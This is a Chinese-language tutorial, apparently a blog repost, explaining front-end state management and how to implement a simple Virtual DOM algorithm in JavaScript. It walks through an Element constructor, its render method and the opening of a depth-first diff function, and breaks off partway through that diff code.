<p>相关链接：<a href="https://github.com/livoras/blog/issues/13">深度剖析：如何实现一个 Virtual DOM 算法</a></p>
<p>源码网址： <a href="https://github.com/livoras/simple-virtual-dom">GitHub</a></p>
<p>目录：</p>
<ul>
<li>对前端应用状态管理思考</li>
<li>Virtual DOM 算法</li>
<li>算法实现
<ul>
<li>步骤一：用JS对象模拟DOM树</li>
<li>步骤二：比较两棵虚拟DOM树的差异</li>
<li>步骤三：把差异应用到真正的DOM树上</li>
</ul>
</li>
<li>结语</li>
<li>References</li>
</ul>
<h3 id="1-对前端应用状态管理的思考">1 对前端应用状态管理的思考</h3>
<p>假如现在你需要写一个像下面一样的表格的应用程序，这个表格可以根据不同的字段进行升序或者降序的展示。</p>
<p><img src="https://pic3.zhimg.com/50/0c1ee6d9a303d5a43b0fa4b3fc82f3a2_hd.png" alt="image"></p>
<p>这个应用程序看起来很简单，你可以想出好几种不同的方式来写。最容易想到的可能是，在你的 JavaScript 代码里面存储这样的数据：</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#000;font-weight:bold">var</span> sortKey <span style="color:#000;font-weight:bold">=</span> <span style="color:#d14">&#34;new&#34;</span> <span style="color:#998;font-style:italic">// 排序的字段，新增（new）、取消（cancel）、净关注（gain）、累积（cumulate）人数
</span><span style="color:#998;font-style:italic"></span><span style="color:#000;font-weight:bold">var</span> sortType <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">1</span> <span style="color:#998;font-style:italic">// 升序还是逆序
</span><span style="color:#998;font-style:italic"></span><span style="color:#000;font-weight:bold">var</span> data <span style="color:#000;font-weight:bold">=</span> [{...}, {...}, {..}, ..] <span style="color:#998;font-style:italic">// 表格数据
</span></code></pre></td></tr></table>
</div>
</div><p>用三个字段分别存储当前排序的字段、排序方向、还有表格数据；然后给表格头部加点击事件：当用户点击特定的字段的时候，根据上面几个字段存储的内容来对内容进行排序，然后用 JS 或者 jQuery 操作 DOM，更新页面的排序状态（表头的那几个箭头表示当前排序状态，也需要更新）和表格内容。</p>
<p>这样做会导致的后果就是，随着应用程序越来越复杂，需要在JS里面维护的字段也越来越多，需要监听事件和在事件回调用更新页面的DOM操作也越来越多，应用程序会变得非常难维护。后来人们使用了 MVC、MVP 的架构模式，希望能从代码组织方式来降低维护这种复杂应用程序的难度。但是 MVC 架构没办法减少你所维护的状态，也没有降低状态更新你需要对页面的更新操作（前端来说就是DOM操作），你需要操作的DOM还是需要操作，只是换了个地方。</p>
<p>既然状态改变了要操作相应的DOM元素，为什么不做一个东西可以让视图和状态进行绑定，状态变更了视图自动变更，就不用手动更新页面了。这就是后来人们想出了 MVVM 模式，只要在模版中声明视图组件是和什么状态进行绑定的，双向绑定引擎就会在状态更新的时候自动更新视图（关于MV*模式的内容，可以看这篇介绍）。</p>
<p>MVVM 可以很好的降低我们维护状态 -&gt; 视图的复杂程度（大大减少代码中的视图更新逻辑）。但是这不是唯一的办法，还有一个非常直观的方法，可以大大降低视图更新的操作：一旦状态发生了变化，就用模版引擎重新渲染整个视图，然后用新的视图更换掉旧的视图。就像上面的表格，当用户点击的时候，还是在JS里面更新状态，但是页面更新就不用手动操作 DOM 了，直接把整个表格用模版引擎重新渲染一遍，然后设置一下innerHTML就完事了。</p>
<p>听到这样的做法，经验丰富的你一定第一时间意识这样的做法会导致很多的问题。最大的问题就是这样做会很慢，因为即使一个小小的状态变更都要重新构造整棵 DOM，性价比太低；而且这样做的话，input和textarea的会失去原有的焦点。最后的结论会是：对于局部的小视图的更新，没有问题（Backbone就是这么干的）；但是对于大型视图，如全局应用状态变更的时候，需要更新页面较多局部视图的时候，这样的做法不可取。</p>
<p>但是这里要明白和记住这种做法，因为后面你会发现，其实 Virtual DOM 就是这么做的，只是加了一些特别的步骤来避免了整棵 DOM 树变更。</p>
<p>另外一点需要注意的就是，上面提供的几种方法，其实都在解决同一个问题：维护状态，更新视图。在一般的应用当中，如果能够很好方案来应对这个问题，那么就几乎降低了大部分复杂性。</p>
<h3 id="2-virtual-dom算法">2. Virtual DOM算法</h3>
<p>DOM是很慢的。如果我们把一个简单的div元素的属性都打印出来，你会看到：</p>
<p><img src="https://pic4.zhimg.com/50/d5cda33e28d83ba12368202645f9e35b_hd.png" alt="image"></p>
<p>而这仅仅是第一层。真正的 DOM 元素非常庞大，这是因为标准就是这么设计的。而且操作它们的时候你要小心翼翼，轻微的触碰可能就会导致页面重排，这可是杀死性能的罪魁祸首。</p>
<p>相对于 DOM 对象，原生的 JavaScript 对象处理起来更快，而且更简单。DOM 树上的结构、属性信息我们都可以很容易地用 JavaScript 对象表示出来：</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#000;font-weight:bold">var</span> element <span style="color:#000;font-weight:bold">=</span> {
  tagName<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;ul&#39;</span>, <span style="color:#998;font-style:italic">// 节点标签名
</span><span style="color:#998;font-style:italic"></span>  props<span style="color:#000;font-weight:bold">:</span> { <span style="color:#998;font-style:italic">// DOM的属性，用一个对象存储键值对
</span><span style="color:#998;font-style:italic"></span>    id<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;list&#39;</span>
  },
  children<span style="color:#000;font-weight:bold">:</span> [ <span style="color:#998;font-style:italic">// 该节点的子节点
</span><span style="color:#998;font-style:italic"></span>    {tagName<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;li&#39;</span>, props<span style="color:#000;font-weight:bold">:</span> {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, children<span style="color:#000;font-weight:bold">:</span> [<span style="color:#d14">&#34;Item 1&#34;</span>]},
    {tagName<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;li&#39;</span>, props<span style="color:#000;font-weight:bold">:</span> {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, children<span style="color:#000;font-weight:bold">:</span> [<span style="color:#d14">&#34;Item 2&#34;</span>]},
    {tagName<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;li&#39;</span>, props<span style="color:#000;font-weight:bold">:</span> {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, children<span style="color:#000;font-weight:bold">:</span> [<span style="color:#d14">&#34;Item 3&#34;</span>]},
  ]
}

</code></pre></td></tr></table>
</div>
</div><p>上面对应的HTML写法是：</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#000080">ul</span> <span style="color:#008080">id</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;list&#39;</span>&gt;
  &lt;<span style="color:#000080">li</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span>&gt;Item 1&lt;/<span style="color:#000080">li</span>&gt;
  &lt;<span style="color:#000080">li</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span>&gt;Item 2&lt;/<span style="color:#000080">li</span>&gt;
  &lt;<span style="color:#000080">li</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span>&gt;Item 3&lt;/<span style="color:#000080">li</span>&gt;
&lt;/<span style="color:#000080">ul</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>既然原来 DOM 树的信息都可以用 JavaScript 对象来表示，反过来，你就可以根据这个用 JavaScript 对象表示的树结构来构建一棵真正的DOM树。</p>
<p>之前的章节所说的，状态变更-&gt;重新渲染整个视图的方式可以稍微修改一下：用 JavaScript 对象表示 DOM 信息和结构，当状态变更的时候，重新渲染这个 JavaScript 的对象结构。当然这样做其实没什么卵用，因为真正的页面其实没有改变。</p>
<p>但是可以用新渲染的对象树去和旧的树进行对比，记录这两棵树差异。记录下来的不同就是我们需要对页面真正的 DOM 操作，然后把它们应用在真正的 DOM 树上，页面就变更了。这样就可以做到：视图的结构确实是整个全新渲染了，但是最后操作DOM的时候确实只变更有不同的地方。</p>
<p>这就是所谓的 Virtual DOM 算法。包括几个步骤：</p>
<ol>
<li>==用 JavaScript 对象结构表示 DOM 树的结构；然后用这个树构建一个真正的 DOM 树，插到文档书中==</li>
<li>==当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较，记录两棵树差异==</li>
<li>==把2所记录的差异应用到步骤1所构建的真正的DOM树上，视图就更新了==</li>
</ol>
<p>Virtual DOM 本质上就是在 JS 和 DOM 之间做了一个缓存。可以类比 CPU 和硬盘，既然硬盘这么慢，我们就在它们之间加个缓存：既然 DOM 这么慢，我们就在它们 JS 和 DOM 之间加个缓存。CPU（JS）只操作内存（Virtual DOM），最后的时候再把变更写入硬盘（DOM）。</p>
<h3 id="3-算法实现">3. 算法实现</h3>
<h4 id="31-步骤一用js对象模拟dom树">3.1 步骤一：用JS对象模拟DOM树</h4>
<p>用 JavaScript 来表示一个 DOM 节点是很简单的事情，你只需要记录它的节点类型、属性，还有子节点：</p>
<p>element.js</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> Element (tagName, props, children) {
  <span style="color:#000;font-weight:bold">this</span>.tagName <span style="color:#000;font-weight:bold">=</span> tagName
  <span style="color:#000;font-weight:bold">this</span>.props <span style="color:#000;font-weight:bold">=</span> props
  <span style="color:#000;font-weight:bold">this</span>.children <span style="color:#000;font-weight:bold">=</span> children
}

module.exports <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">function</span> (tagName, props, children) {
  <span style="color:#000;font-weight:bold">return</span> <span style="color:#000;font-weight:bold">new</span> Element(tagName, props, children)
}

</code></pre></td></tr></table>
</div>
</div><p>例如上面的 DOM 结构就可以简单的表示：</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">var</span> el <span style="color:#000;font-weight:bold">=</span> require(<span style="color:#d14">&#39;./element&#39;</span>)

<span style="color:#000;font-weight:bold">var</span> ul <span style="color:#000;font-weight:bold">=</span> el(<span style="color:#d14">&#39;ul&#39;</span>, {id<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;list&#39;</span>}, [
  el(<span style="color:#d14">&#39;li&#39;</span>, {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, [<span style="color:#d14">&#39;Item 1&#39;</span>]),
  el(<span style="color:#d14">&#39;li&#39;</span>, {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, [<span style="color:#d14">&#39;Item 2&#39;</span>]),
  el(<span style="color:#d14">&#39;li&#39;</span>, {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, [<span style="color:#d14">&#39;Item 3&#39;</span>])
])
</code></pre></td></tr></table>
</div>
</div><p>现在ul只是一个 JavaScript 对象表示的 DOM 结构，页面上并没有这个结构。我们可以根据这个ul构建真正的:</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
Element.prototype.render <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">function</span> () {
  <span style="color:#000;font-weight:bold">var</span> el <span style="color:#000;font-weight:bold">=</span> <span style="color:#0086b3">document</span>.createElement(<span style="color:#000;font-weight:bold">this</span>.tagName) <span style="color:#998;font-style:italic">// 根据tagName构建
</span><span style="color:#998;font-style:italic"></span>  <span style="color:#000;font-weight:bold">var</span> props <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">this</span>.props

  <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> propName <span style="color:#000;font-weight:bold">in</span> props) { <span style="color:#998;font-style:italic">// 设置节点的DOM属性
</span><span style="color:#998;font-style:italic"></span>    <span style="color:#000;font-weight:bold">var</span> propValue <span style="color:#000;font-weight:bold">=</span> props[propName]
    el.setAttribute(propName, propValue)
  }

  <span style="color:#000;font-weight:bold">var</span> children <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">this</span>.children <span style="color:#000;font-weight:bold">||</span> []

  children.forEach(<span style="color:#000;font-weight:bold">function</span> (child) {
    <span style="color:#000;font-weight:bold">var</span> childEl <span style="color:#000;font-weight:bold">=</span> (child <span style="color:#000;font-weight:bold">instanceof</span> Element)
      <span style="color:#000;font-weight:bold">?</span> child.render() <span style="color:#998;font-style:italic">// 如果子节点也是虚拟DOM，递归构建DOM节点
</span><span style="color:#998;font-style:italic"></span>      <span style="color:#000;font-weight:bold">:</span> <span style="color:#0086b3">document</span>.createTextNode(child) <span style="color:#998;font-style:italic">// 如果字符串，只构建文本节点
</span><span style="color:#998;font-style:italic"></span>    el.appendChild(childEl)
  })

  <span style="color:#000;font-weight:bold">return</span> el
}
</code></pre></td></tr></table>
</div>
</div><p>render方法会根据tagName构建一个真正的DOM节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。所以只需要：</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">var</span> ulRoot <span style="color:#000;font-weight:bold">=</span> ul.render()
<span style="color:#0086b3">document</span>.body.appendChild(ulRoot)
</code></pre></td></tr></table>
</div>
</div><p>上面的ulRoot是真正的DOM节点，把它塞入文档中，这样body里面就有了真正的ul的DOM结构：</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">&lt;</span>ul id<span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;list&#39;</span><span style="color:#000;font-weight:bold">&gt;</span>
  <span style="color:#000;font-weight:bold">&lt;</span>li <span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span><span style="color:#000;font-weight:bold">&gt;</span>Item <span style="color:#099">1</span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#a61717;background-color:#e3d2d2">/li&gt;</span>
  <span style="color:#000;font-weight:bold">&lt;</span>li <span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span><span style="color:#000;font-weight:bold">&gt;</span>Item <span style="color:#099">2</span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#a61717;background-color:#e3d2d2">/li&gt;</span>
  <span style="color:#000;font-weight:bold">&lt;</span>li <span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span><span style="color:#000;font-weight:bold">&gt;</span>Item <span style="color:#099">3</span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#a61717;background-color:#e3d2d2">/li&gt;</span>
<span style="color:#000;font-weight:bold">&lt;</span><span style="color:#a61717;background-color:#e3d2d2">/ul&gt;</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="32-步骤二比较两棵虚拟dom树的差异">3.2 步骤二：比较两棵虚拟DOM树的差异</h4>
<p>正如你所预料的，比较两棵DOM树的差异是 Virtual DOM 算法最核心的部分，这也是所谓的 Virtual DOM 的 diff 算法。两个树的完全的 diff 算法是一个时间复杂度为 O(n^3) 的问题。但是在前端当中，你很少会跨越层级地移动DOM元素。所以 Virtual DOM 只会对同一个层级的元素进行对比：</p>
<p><img src="https://pic2.zhimg.com/50/6d64b0b7889e7f020bb020aea5947a09_hd.png" alt="image"></p>
<p>上面的div只会和同一层级的div对比，第二层级的只会跟第二层级对比。这样算法复杂度就可以达到 O(n)。</p>
<h5 id="321-深度优先遍历记录差异">3.2.1 深度优先遍历，记录差异</h5>
<p>在实际的代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个唯一的标记：</p>
<p><img src="https://pic2.zhimg.com/50/c4ba535164d29fd46383d19512c37349_hd.png" alt="image"></p>
<p>在深度优先遍历的时候，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面。</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
<span style="color:#998;font-style:italic">// diff 函数，对比两棵树
</span><span style="color:#998;font-style:italic"></span><span style="color:#000;font-weight:bold">function</span> diff (oldTree, newTree) {
  <span style="color:#000;font-weight:bold">var</span> index <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span> <span style="color:#998;font-style:italic">// 当前节点的标志
</span><span style="color:#998;font-style:italic"></span>  <span style="color:#000;font-weight:bold">var</span> patches <span style="color:#000;font-weight:bold">=</span> {} <span style="color:#998;font-style:italic">// 用来记录每个节点差异的对象
</span><span style="color:#998;font-style:italic"></span>  dfsWalk(oldTree, newTree, index, patches)
  <span style="color:#000;font-weight:bold">return</span> patches
}

